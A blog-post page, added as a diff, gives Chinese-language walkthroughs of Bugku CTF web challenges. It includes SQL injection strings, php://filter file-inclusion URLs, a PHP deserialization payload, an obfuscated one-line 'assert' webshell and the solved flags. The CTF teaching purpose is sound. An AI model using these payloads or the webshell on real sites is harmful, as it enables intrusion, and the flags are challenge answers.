@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>bugku练习 | Yyx</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1622952381444">
+<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="WEB2
+题目链接：
+[bugku][http://123.206.87.240:8002/web2/
+点击链接出现页面然后按下f12
+
+得到key.
+web基础$_POST**
+题目链接:
+[bugku][http://123.206.8..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://www.yyxyy.xyz/">
+        <img src="https://www.yyxyy.xyz//images/avatar.png?v=1622952381444" class="site-logo">
+        <h1 class="site-title">Yyx</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      记得在这杂乱的生活里，带点微笑
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">bugku练习</h2>
+            <div class="post-date">2021-06-06</div>
+            
+            <div class="post-content" v-pre>
+              <h4 id="web2"><strong>WEB2</strong></h4>
+<h2 id="题目链接bugkuhttp123206872408002web2点击链接出现页面然后按下f12得到key"><strong>题目链接：</strong><br>
+<strong>[bugku][http://123.206.87.240:8002/web2/</strong><br>
+<strong>点击链接出现页面然后按下f12</strong><br>
+<img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bugku/1.png" alt="" loading="lazy"><br>
+<strong>得到key.</strong></h2>
+<h4 id="web基础_post">web基础$_POST**</h4>
+<p><strong>题目链接:</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/post/</strong></p>
+<p><strong>打开还是一段代码,只是换成post方式</strong></p>
+<pre><code class="language-php">$what=$_POST['what'];
+echo $what;
+if($what=='flag')
+echo 'flag{****}';
+</code></pre>
+<p><strong>这次利用火狐的一个插件hackbar,点击Postdata写入what=flag,运行即可.</strong></p>
+<hr>
+<h4 id="矛盾"><strong>矛盾</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/get/index1.php</strong></p>
+<p><strong>打开还是一段代码,</strong></p>
+<pre><code class="language-php">$num=$_GET['num'];//get请求
+if(!is_numeric($num))//is_numeric($num)num=数字,return true,加了&quot;!&quot;所以num=字符进循环
+{
+echo $num;
+if($num==1)
+echo 'flag{**********}';
+}
+</code></pre>
+<p><strong>php是弱类型语言,==只需要数值等于,类型随意,所以我们用num=1a这个字符串进入if语句.字符串与数字比较时,php会读到第一个不是数字的地方停止.例如下面这段代码</strong></p>
+<pre><code class="language-php">&lt;?php
+$a='1a2';
+echo (int)$a;
+?&gt;
+//输出的结果为1
+</code></pre>
+<p><strong>所以构造[bugku][http://123.206.87.240:8002/get/index1.php?num=1a.就可以得到flag.</strong></p>
+<hr>
+<h4 id="web3"><strong>web3</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/web3/</strong></p>
+<p><strong>打开链接有个弹窗,查看网页源代码找到这段代码.</strong></p>
+<pre><code class="language-html">&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;
+
+</code></pre>
+<p><strong>unicode编码,解码得KEY{J2sa42ahJK-HS11III}</strong></p>
+<h4 id="你必须让他停下"><strong>你必须让他停下</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/web12/</strong></p>
+<p><strong>打开链接就不停的闪,用burpsuit抓包看看.发送到repeater,不停的go,当出现第10张图片,就出flag{dummy_game_1s_s0_popular},这题什么意思...</strong></p>
+<hr>
+<h4 id="本地包含"><strong>本地包含</strong></h4>
+<p><strong>题目坏掉了...</strong></p>
+<p><strong>转了一下别人写的.</strong></p>
+<p><strong>[转][https://blog.csdn.net/dyw_666666/article/details/82389457</strong></p>
+<hr>
+<h4 id="变量1"><strong>变量1</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8004/index1.php</strong></p>
+<p><strong>打开出现一段代码</strong></p>
+<pre><code class="language-php">//flag In the variable ! 
+&lt;?php  
+error_reporting(0);// 关闭错误报告
+include &quot;flag1.php&quot;;//调用flag1.php文件
+highlight_file(__file__);//函数对文件进行语法高亮显示
+if(isset($_GET['args'])){//isset检测变量是否已设置并且非 NULL
+    $args = $_GET['args'];
+    if(!preg_match(&quot;/^\w+$/&quot;,$args)){
+//正则匹配,&quot;/&quot;&quot;/&quot;代表开始合结束&quot;^&quot;开始字符&quot;$&quot;结束字符&quot;\w&quot;代表大小写英文和数字'+'代表可以有多个.
+        die(&quot;args error!&quot;);
+    }
+    eval(&quot;var_dump($$args);&quot;);//$$可变变量
+}
+?&gt;
+</code></pre>
+<p><strong>可变变量解释</strong></p>
+<pre><code class="language-php">&lt;?php
+$a='b';
+$b='c';
+echo $a.&quot;\n&quot;;
+echo $b.&quot;\n&quot;;
+echo $$a;
+?&gt;
+/*输出结果
+b
+c
+c*/
+</code></pre>
+<p><strong>所以给args传一个全局变量GLOBALS就行了</strong></p>
+<p><strong>构造[bugku][http://123.206.87.240:8004/index1.php?args=GLOBALS</strong></p>
+<p><strong>php九大全局变量</strong></p>
+<ul>
+<li><strong>$_POST [用于接收post提交的数据]</strong></li>
+<li><strong>$_GET [用于获取url地址栏的参数数据]</strong></li>
+<li><strong>$_FILES [用于文件就收的处理img 最常见]</strong></li>
+<li><strong>$_COOKIE [用于获取与setCookie()中的name 值]</strong></li>
+<li><strong>$_SESSION [用于存储session的值或获取session中的值]</strong></li>
+<li><strong>$_REQUEST [具有get,post的功能，但比较慢]</strong></li>
+<li><strong>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</strong></li>
+<li><strong>$GLOBALS [一个包含了全部变量的全局组合数组]</strong></li>
+<li><strong>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</strong></li>
+</ul>
+<hr>
+<h4 id="web5"><strong>web5</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/web5/</strong></p>
+<p><strong>题目已经提醒了jsfuck,打开网页发现jsfuck,复制粘贴丢控制台,得到ctf{whatfk}.</strong></p>
+<hr>
+<h4 id="头等舱"><strong>头等舱</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:9009/hd.php</strong></p>
+<p><strong>打开链接什么都没有,查看源代码也没有,网络请求也没有...</strong></p>
+<p><strong>burpsuit抓包,发送到repeater,go一下就出现flag{Bugku_k8_23s_istra}.</strong></p>
+<hr>
+<h4 id="网站被黑"><strong>网站被黑</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/webshell/</strong></p>
+<p><strong>题目说实战经常用到,拿御剑扫描到了webshell.php,发现一个马,弱口令无果,爆破得到密码为hack,输入密码就得到了flag{hack_bug_ku035} .</strong></p>
+<hr>
+<h4 id="管理员系统">管理员系统**</h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.31.85:1003/</strong></p>
+<p><strong>先查看源码,没东西,审查元素发现了段base64, dGVzdDEyMw== ,解密得test123,这肯定是密码了,输入账号admin密码test123,说IP禁止访问，请联系本地管理员登陆，IP已被记录. 那么将ip地址伪造为127.0.0.1输入账号密码就得到了flag.</strong></p>
+<hr>
+<h4 id="web4"><strong>web4</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/web4/</strong></p>
+<p><strong>题目让我们查看源码,那就查看源码,发现了一段代码</strong></p>
+<pre><code class="language-javascript">var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';
+var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';
+eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));
+</code></pre>
+<p><strong>有url编码,解码得</strong></p>
+<pre><code class="language-javascript">var p1 = 'function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2b';
+var p2 = 'aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;';
+eval(unescape(p1) + unescape('54aa2' + p2));
+</code></pre>
+<p><strong>有点乱不好看,整理合并eval.</strong></p>
+<pre><code class="language-javascript">function checkSubmit()
+{
+    var a=document.getElementById(&quot;password&quot;);
+    if(&quot;undefined&quot;!=typeof a)
+    	{
+            if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)
+        		return!0;
+            alert(&quot;Error&quot;);
+            a.focus();
+            return!1
+        }
+}
+document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;
+</code></pre>
+<p><strong>读代码,大意就是把那串代码填入输入框点确定就可以.得到flag.</strong></p>
+<hr>
+<h4 id="flag在index里"><strong>flag在index里</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8005/post/</strong></p>
+<p><strong>这题看题目就想到了php://filter...</strong></p>
+<p><strong>点开链接确实,点击click me?no链接,得到[1][http://123.206.87.240:8005/post/index.php?file=show.php</strong></p>
+<p><strong>直接构造链接[2][http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 得到一段base64,解码得到.</strong></p>
+<pre><code class="language-php+HTML">&lt;html&gt;
+    &lt;title&gt;Bugku-ctf&lt;/title&gt;
+    
+&lt;?php
+	error_reporting(0);
+	if(!$_GET[file]){echo '&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;';}
+	$file=$_GET['file'];
+	if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){
+		echo &quot;Oh no!&quot;;
+		exit();
+	}
+	include($file); 
+//flag:flag{edulcni_elif_lacol_si_siht}
+?&gt;
+&lt;/html&gt;
+
+</code></pre>
+<p><strong>关于php://filter推荐看看大佬blog [p][https://www.leavesongs.com/PENETRATION/php-filter-magic.html</strong></p>
+<hr>
+<h4 id="输入密码查看flag"><strong>输入密码查看flag</strong></h4>
+<p><strong>题目地址</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/baopo/</strong></p>
+<p><strong>提示5位数字密码,直接用burpsuit爆破就ok.</strong></p>
+<p><strong>不想发图,就给个链接[1][https://jingyan.baidu.com/article/ca41422f054c881eae99eda0.html 按这个教程就能爆破</strong></p>
+<hr>
+<h4 id="点击一百万次"><strong>点击一百万次</strong></h4>
+<p><strong>题目地址</strong></p>
+<p><strong>[bugku][http://123.206.87.240:9001/test/</strong></p>
+<p><strong>查看源码有一段代码</strong></p>
+<pre><code class="language-JavaScript">var clicks=0
+    $(function() {
+      $(&quot;#cookie&quot;)
+        .mousedown(function() {
+          $(this).width('350px').height('350px');
+        })
+        .mouseup(function() {
+          $(this).width('375px').height('375px');
+          clicks++;
+          $(&quot;#clickcount&quot;).text(clicks);
+          if(clicks &gt;= 1000000){
+          	var form = $('&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;' +
+						'&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;' + clicks + '&quot; hidden/&gt;' +
+						'&lt;/form&gt;');
+						$('body').append(form);
+						form.submit();
+          }
+        });
+    });
+</code></pre>
+<p><strong>里面有个form表单用到post提交,可以利用hackbar上传clicks值,也可以抓包该包,都可以获取到flag.</strong></p>
+<hr>
+<h4 id="备份是个好习惯"><strong>备份是个好习惯</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku][http://123.206.87.240:8002/web16/</strong></p>
+<p><strong>点开链接给了串数字,试了下没什么用.</strong></p>
+<p><strong>看题目名字是备份,就去试一试 .bak, .svn, .git等等,最后发现了index.php.bak存在,下载后是一段代码.</strong></p>
+<pre><code class="language-php">&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: Norse
+ * Date: 2017/8/6
+ * Time: 20:22
+*/
+
+include_once &quot;flag.php&quot;;
+ini_set(&quot;display_errors&quot;, 0);//不显示错误报告 
+$str = strstr($_SERVER['REQUEST_URI'], '?');//返回 ?和 ?后面的所有字符.
+$str = substr($str,1);//返回字符串第一个字符以后的所有字符.
+$str = str_replace('key','',$str);//将str里面的key替换为空,所有的都要替换.
+parse_str($str);//把查询字符串解析到变量中
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
+    echo $flag.&quot;取得flag&quot;;
+}
+?&gt;
+</code></pre>
+<p><strong>把查询字符串解析到变量中例子</strong></p>
+<pre><code class="language-php">&lt;?php
+$data = &quot;a=1&amp;b=2&quot;;
+parse_str($data);
+echo $a;
+?&gt;
+   //输出a=1
+</code></pre>
+<p><strong>前面会将key替换为空,所以利用kekeyy来绕过.</strong></p>
+<p><strong>if条件中key1和key2的md5值相同,但是本身不能相等,参考链接[1][https://www.cnblogs.com/xishaonian/p/7628152.html</strong></p>
+<p><strong>所以构造[2][http://123.206.87.240:8002/web16/index.php?kkeyey1=240610708&amp;kekeyy2=QNKCDZO</strong></p>
+<p><strong>可以获得flag</strong></p>
+<p><strong>还有一种绕过if语句的就是数组经过md5加密都为空,后面随便加点东西就绕过了!==,</strong></p>
+<p><strong>所以构造[3]:http://123.206.87.240:8002/web16/index.php?kkeyey1[]=240610708&amp;kekeyy2[]=QNKCDZO</strong></p>
+<hr>
+<h4 id="成绩单"><strong>成绩单</strong></h4>
+<p><strong>题目链接</strong></p>
+<p>[bugku][http://123.206.87.240:8002/chengjidan/</p>
+<p><strong>打开链接发现了一个表单,上面写着1,2,3...这个题一看就是注入,</strong></p>
+<p><strong>审查元素发现这段代码</strong></p>
+<pre><code class="language-html">&lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt; 
+   &lt;input style=&quot;width:300px;height:40px;font-size:18px;&quot; name=&quot;id&quot; placeholder=&quot;1,2,3...&quot; type=&quot;text&quot; /&gt;
+   &lt;br /&gt;
+   &lt;br /&gt;
+   &lt;br /&gt;
+   &lt;br /&gt;
+   &lt;br /&gt; 
+   &lt;input style=&quot;width:100px;height:40px;&quot; value=&quot;Submit&quot; type=&quot;submit&quot; /&gt; 
+  &lt;/form&gt;
+</code></pre>
+<p><strong>通过post提交,然后name=&quot;id&quot;</strong></p>
+<p><strong>所以就用hackbar试试post注入,发现没有任何过滤...常规操作.</strong></p>
+<pre><code class="language-sql">id=1' and 1=1#
+id=1' and 1=2#
+id=-1' order by 1# 
+id=-1' order by 2# id=1' order by 3# 
+id=-1' order by 4# id=1' order by 5# id=' union select 1,2,3,4# 
+
+id=-1' union select 1,2,3,database()# id=' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# 
+
+id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='fl4g'# 
+
+id=-1' union select 1,2,3,skctf_flag from fl4g#
+</code></pre>
+<p><strong>得到BUGKU{Sql_INJECT0N_4813drd8hz4}</strong></p>
+<hr>
+<h4 id="秋名山老司机"><em>秋名山老司机</em>*</h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:8002/qiumingshan/</strong></p>
+<p><strong>打开链接------亲请在2s内计算老司机的车速是多少,一看就写脚本计算.</strong></p>
+<pre><code class="language-python">#conding:utf-8
+import requests
+import re
+url=&quot;http://123.206.87.240:8002/qiumingshan/&quot;
+s=requests.Session()
+r=s.get(url)
+search=re.findall('&lt;div&gt;(.*)&lt;/div&gt;',r.text)#正则匹配数学表达式
+
+search=''.join(search)#将得到的列表转为字符串
+search=search[:-3]#因为将匹配了&quot;=?;&quot;,所以最后3个字符去掉.
+result=eval(search)#计算表达式
+datas={'value':result}
+flag=s.post(url,data=datas)#发送post包.
+print(flag.text)#打印响应的内容
+</code></pre>
+<p><strong>输出结果åæ¥ä½ ä¹æº Bugku{YOU_DID_IT_BY_SECOND}</strong></p>
+<hr>
+<h4 id="cookies欺骗"><strong>cookies欺骗</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:8002/web11/</strong></p>
+<p><strong>打开链接发现一段代码没什么用,然后抓包试试,发现他URL有段base64,解码得到keys.txt,于是想到读取index.php,将其用base64加密,go一下发现了&quot;&lt;?php&quot;.</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bugku/2.png" alt="" loading="lazy"></figure>
+<p><strong>发现url里面有个line=,把这里改成line=2,go一下发现另一段代码,这就是源码了,发送到intruder,爆破line得到完整代码,读源码发现了keys.php.</strong></p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0); 
+$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:&quot;&quot;); 
+$line=isset($_GET['line'])?intval($_GET['line']):0; 
+if($file=='') header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); 
+$file_list = array( 
+'0' =&gt;'keys.txt', 
+'1' =&gt;'index.php', 
+); 
+//当有cookies margin=margin时会有keys.php
+if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){        
+$file_list[2]='keys.php';
+}   
+if(in_array($file, $file_list)){ 
+$fa = file($file); 
+echo $fa[$line]; 
+} 
+?&gt;
+</code></pre>
+<p><strong>最后添加cookies,然后访问base64加密后的keys.php,查看源代码得到flag.</strong></p>
+<hr>
+<h4 id="never-give-up"><strong>never give up</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]<a href="http://123.206.87.240:8006/test/hello.php?id=1">http://123.206.87.240:8006/test/hello.php?id=1</a></strong></p>
+<p><strong>打开链接查看源码发现<!--1p.html-->所以打开1p.html,结果发现其跳转到bugku社区,用burp抓包得到</strong></p>
+<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bugku/3.png" alt="" loading="lazy"></figure>
+<p><strong>发现代码是加密了的.</strong></p>
+<p><strong>url解码</strong></p>
+<pre><code class="language-javascript">var Words =&quot;&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; 
+&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;&quot; 
+function OutWord()
+{
+var NewWords;
+NewWords = unescape(Words);
+document.write(NewWords);
+} 
+OutWord();
+</code></pre>
+<p><strong>发现了base64,解码,得到的代码是经过url编码的,继续解码得</strong></p>
+<pre><code class="language-php">&quot;;if(!$_GET['id'])
+{
+	header('Location: hello.php?id=1');
+	exit();
+}
+$id=$_GET['id'];
+$a=$_GET['a'];
+$b=$_GET['b'];
+//查找 &quot;.&quot; 在字符串中第一次出现的位置,如果没有查询到就返回空
+if(stripos($a,'.'))
+{
+	echo 'no no no no no no no';
+	return ;
+}
+$data = @file_get_contents($a,'r');
+if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+{
+	require(&quot;f4l2a3g.txt&quot;);
+}
+else
+{
+	print &quot;never never never give up !!!&quot;;
+}
+?&gt;
+</code></pre>
+<p><strong>发现源码里面有f4l2a3g.txt访问就可以得到flag.</strong></p>
+<p><strong>但是题目本意应该是绕过16行的代码.</strong></p>
+<p><strong>1.id为非空非零且弱等于0,则可以另id='a'</strong></p>
+<p><strong>2.data是由函数file_get_contents()读取变量a的值.可以利用php://input访问原始请求数据的只读流,在请求主体中上传&quot;bugku is a nice plateform!&quot;就ok.</strong></p>
+<p><strong>3.eregi() 截断漏洞利用,访问到空字符就会截断,就会匹配成功.</strong></p>
+<p><strong>所以</strong></p>
+<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bugku/4.png" alt="" loading="lazy"></figure>
+<hr>
+<h4 id="welcome-to-bugkuctf"><strong>welcome to bugkuctf</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]http://123.206.87.240:8006/test1/</strong></p>
+<p><strong>查看源码</strong></p>
+<pre><code class="language-php">$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+  
+if(isset($user)&amp;&amp;(file_get_contents($user,'r')===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+}else{  
+    echo &quot;you are not admin ! &quot;;  
+}  
+</code></pre>
+<p><strong>发现可以通过php://input进入循环,代码里面又提示了hint.php,于是又想到了文件包含,</strong></p>
+<p><strong>所以构造?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</strong></p>
+<p><strong>得到了一段base64</strong></p>
+<pre><code class="language-python">PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA==  
+</code></pre>
+<pre><code class="language-php">&lt;?php    
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+			echo &quot;&lt;br&gt;&quot;;
+		return (&quot;good&quot;);
+        }  
+    }  
+}  
+?&gt;  
+</code></pre>
+<p><strong>发现flag.php,读flag.php没东西,读一下index.php发现解码</strong></p>
+<pre><code class="language-php">&lt;?php  
+$txt = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$password = $_GET[&quot;password&quot;];  
+  
+if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello friend!&lt;br&gt;&quot;;  
+    if(preg_match(&quot;/flag/&quot;,$file)){ 
+		echo &quot;不能现在就给你flag哦&quot;;
+        exit();  
+    }else{  
+        include($file);   
+        $password = unserialize($password); //反序列化. 
+        echo $password;  
+    }  
+}else{  
+    echo &quot;you are not the number of bugku ! &quot;;  
+}  
+  
+?&gt;  
+  
+&lt;!--  
+$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+  
+if(isset($user)&amp;&amp;(file_get_contents($user,'r')===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+}else{  
+    echo &quot;you are not admin ! &quot;;  
+}  
+ --&gt;  
+</code></pre>
+<p><strong>发现代码里面有反序列化,于是就可以通过序列化得到flag.php里面的值,再将其反序列化输出</strong></p>
+<pre><code class="language-php">&lt;?php
+    class Flag{
+    public $file;
+	}
+	$a=new Flag();
+    $a-&gt;file=flag.php;
+    $a=serialize($a);
+    print_r($a);
+//值为  O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}
+?&gt;
+</code></pre>
+<p><strong>于是构造payload</strong></p>
+<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bugku/5.png" alt="" loading="lazy"></figure>
+<hr>
+<h4 id="过狗一句话"><strong>过狗一句话</strong></h4>
+<pre><code class="language-php">&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt;
+</code></pre>
+<p><strong>就是一句话木马</strong></p>
+<p><strong>paylod     ?s=print_r(scandir('./'))</strong></p>
+<p><strong>scandir() 函数 返回一个数组，数组包含指定路径中的文件和目录</strong></p>
+<p><strong>print_r()函数  以易于理解的格式打印变量</strong></p>
+<hr>
+<h4 id="字符正则"><strong>字符正则</strong></h4>
+<p><strong>题目链接</strong></p>
+<p><strong>[bugku]<a href="http://123.206.87.240:8002/web10/">http://123.206.87.240:8002/web10/</a></strong></p>
+<pre><code class="language-php"> &lt;?php 
+highlight_file('2.php');
+$key='KEY{********************************}';
+$IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);
+if( $IM ){ 
+  die('key is: '.$key);
+}
+?&gt; 
+</code></pre>
+<p><strong>看代码就是绕过正则就ok了</strong></p>
+<p><strong>/..../   代表开始和结束</strong></p>
+<p><strong>.   表示任意字符</strong></p>
+<p>*<strong>表示后面字符1个或者多个</strong></p>
